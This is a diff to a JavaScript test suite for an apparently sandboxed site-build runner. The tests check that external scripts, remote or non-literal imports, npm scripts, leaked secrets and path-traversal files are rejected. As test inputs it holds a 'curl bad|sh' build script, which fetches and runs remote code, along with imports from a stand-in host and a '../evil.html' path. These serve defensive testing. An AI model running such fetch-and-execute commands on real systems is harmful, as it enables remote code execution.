@@ -10,6 +10,7 @@ it('missing local dependency fails',async()=>expect((await run({...files,'app.js
 it('external script rejected',async()=>expect((await run({'index.html':'<script src="https://bad.test/app.js"></script>'})).logs).toContain('external_dependency_denied'));
 it.each(['../other.js','node:fs','https://bad.test/x.js'])('import %s denied',async path=>expect((await run({...files,'app.js':'import x from '+JSON.stringify(path)})).r.status).toBe('failed'));
 it('npm dependencies and scripts denied',async()=>{for(const packageJson of [{dependencies:{react:'*'}},{scripts:{build:'curl bad|sh'}},{devDependencies:{vite:'*'}}])expect((await run({...files,'package.json':JSON.stringify(packageJson)})).r.status).toBe('failed')});
+it('bare and nonliteral imports denied',async()=>{for(const code of ['import x from "lib.js"','import(unknownPath)','import("https://bad.test/x.js")'])expect((await run({...files,'app.js':code})).r.status).toBe('failed')});
 it('source quotas',async()=>expect((await run({...files,'big.txt':'x'.repeat(500001)})).r.status).toBe('failed'));
 it('secret source rejected',async()=>expect((await run({...files,'secret.txt':'api_key=123456789secret'})).r.status).toBe('failed'));
 it('path traversal artifacts rejected',()=>expect(()=>archive({'../evil.html':'bad'})).toThrow());
